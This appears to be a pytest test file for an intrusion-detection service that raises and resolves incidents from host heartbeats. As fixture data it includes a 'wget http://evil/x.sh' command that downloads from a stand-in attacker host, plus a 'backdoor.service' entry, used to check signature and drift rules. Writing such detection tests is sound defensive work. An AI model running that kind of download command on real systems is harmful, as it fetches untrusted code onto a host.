from tests.conftest import make_heartbeat


def send(client, **kwargs):
    return client.post("/heartbeat", json=make_heartbeat(**kwargs)).get_json()


def open_incidents(client):
    return client.get("/incidents?status=Open").get_json()


def test_first_heartbeat_only_creates_baseline(client):
    assert send(client, processes=[("curl", "curl http://x")])["incidents"] == 0
    assert open_incidents(client) == []


def test_signature_rule_fires_then_resolves(client):
    send(client, processes=[("bash", "/bin/bash")])  # baseline

    assert send(client, processes=[("bash", "/bin/bash"), ("wget", "wget http://evil/x.sh")])["incidents"] >= 1
    titles = {i["title"] for i in open_incidents(client)}
    assert "Wget Download" in titles

    # Same heartbeat again must not duplicate the open incident.
    before = len(open_incidents(client))
    send(client, processes=[("bash", "/bin/bash"), ("wget", "wget http://evil/x.sh")])
    assert len(open_incidents(client)) == before

    # Once the process is gone the incident is resolved.
    send(client, processes=[("bash", "/bin/bash")])
    assert "Wget Download" not in {i["title"] for i in open_incidents(client)}


def test_new_service_is_drift_but_benign_service_is_ignored(client):
    send(client, services=["sshd.service"])  # baseline

    send(client, services=["sshd.service", "snapd.service"])
    assert open_incidents(client) == []

    send(client, services=["sshd.service", "snapd.service", "backdoor.service"])
    incidents = open_incidents(client)
    assert [(i["rule_id"], i["evidence"]) for i in incidents] == [("DRIFT-SERVICES", "backdoor.service")]

    # Removing the service resolves the drift incident.
    send(client, services=["sshd.service", "snapd.service"])
    assert open_incidents(client) == []
